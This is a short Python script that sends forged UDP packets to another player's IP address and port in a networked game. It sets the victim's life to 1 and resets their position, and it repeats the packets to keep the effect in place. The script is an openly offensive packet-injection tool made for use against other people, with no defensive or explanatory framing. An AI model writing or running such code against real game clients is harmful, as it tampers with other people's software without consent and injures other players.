import socket

def nerf_player(target_ip, target_port):
    """
    Sends malicious UDP packets to nerf the other player's stats.
    
    Args:
        target_ip (str): IP address of the player to attack.
        target_port (int): Port number of the player to attack.
    """
    # Create a UDP socket
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Craft malicious data
    life_nerf_packet = "LIFE:1"  # Set player's life to 1
    pos_nerf_packet = "POS:0,0"  # Move the player to coordinates (0, 0)
    
    # Send the packets
    print(f"Sending LIFE nerf to {target_ip}:{target_port}")
    s.sendto(life_nerf_packet.encode(), (target_ip, target_port))
    
    # Optionally, keep sending packets to ensure the nerf is enforced
    print("Nerfing the player repeatedly...")
    for _ in range(10):  # Adjust number of packets as needed
        s.sendto(life_nerf_packet.encode(), (target_ip, target_port))
        s.sendto(pos_nerf_packet.encode(), (target_ip, target_port))

if __name__ == "__main__":
    # Replace these values with the target player's IP and port
    TARGET_IP = "192.168.35.249"  # Example IP
    TARGET_PORT = 1234  # Example Port
    
    nerf_player(TARGET_IP, TARGET_PORT)
